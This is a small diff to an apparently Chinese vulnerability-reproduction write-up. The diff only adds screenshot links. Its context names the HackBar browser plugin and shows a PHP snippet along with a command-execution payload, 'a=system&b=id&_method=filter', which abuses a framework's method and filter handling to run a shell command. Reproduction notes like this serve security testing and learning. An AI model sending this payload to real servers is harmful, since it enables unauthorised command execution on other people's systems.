@@ -5,6 +5,7 @@
 
 ### 二、工具准备
 使用的Hacker(https://github.com/Mr-xn/hackbar2.1.3)浏览器插件
+
 ![image](https://user-images.githubusercontent.com/30569668/128801110-dfbdd6b2-fe89-45de-a2ac-308379ee76d2.png)
 
 
@@ -13,3 +14,4 @@
 语句：error_reporting(0);
 Payload：a=system&b=id&_method=filter
 
+![image](https://user-images.githubusercontent.com/30569668/128801826-ef08cf34-b3f7-417a-82e6-0dc96ea6a671.png)
